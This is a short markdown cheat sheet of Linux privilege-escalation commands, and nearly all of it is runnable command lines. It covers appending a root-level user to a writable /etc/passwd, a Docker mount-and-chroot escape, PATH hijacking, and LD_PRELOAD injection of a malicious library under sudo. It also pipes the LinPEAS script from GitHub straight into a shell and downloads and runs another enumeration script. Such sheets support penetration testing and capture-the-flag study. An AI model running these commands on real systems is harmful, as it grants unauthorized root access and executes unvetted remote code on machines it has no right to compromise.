---
layout: default
---

# Linux Privilege Escalation Techniques
```
# SUID/SGID binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -o -perm -2000 -o -perm -6000 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable /etc/passwd
echo 'newuser:$(openssl passwd -1 password123):0:0:root:/root:/bin/bash' >> /etc/passwd

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
grep "CRON" /var/log/syslog

# NFS no_root_squash
cat /etc/exports
showmount -e <target>

# Kernel exploits
uname -a
searchsploit linux kernel <version>

# Docker escape
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Sudo exploits
sudo -l
# GTFOBins for sudo bypass: https://gtfobins.github.io/

# Path hijacking
echo $PATH
export PATH=/tmp:$PATH

# LD_PRELOAD
sudo LD_PRELOAD=/path/to/malicious.so <command>
```

## Linux Enumeration Scripts
    ```
    # LinPEAS
    curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

    # LinEnum
    ./LinEnum.sh -t                                  # Thorough mode

    # Linux Smart Enumeration
    wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh; chmod +x lse.sh; ./lse.sh

    # Unix-privesc-check
    ./unix-privesc-check standard > output.txt
    ```